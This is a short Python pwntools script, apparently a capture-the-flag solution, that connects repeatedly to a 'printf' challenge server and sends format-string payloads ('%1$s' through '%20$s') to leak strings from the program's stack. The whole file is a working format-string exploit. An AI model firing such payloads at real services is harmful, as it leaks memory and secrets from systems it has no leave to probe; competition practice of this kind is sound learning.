from pwn import *
context.log_level = logging.WARNING

for i in range(20):
    r = remote("printf.litctf.live", 1337)

    payload = f"%{i+1}$s".encode()
    assert len(payload) <= 20

    r.sendline(payload)
    print(r.recvall().strip()[100:])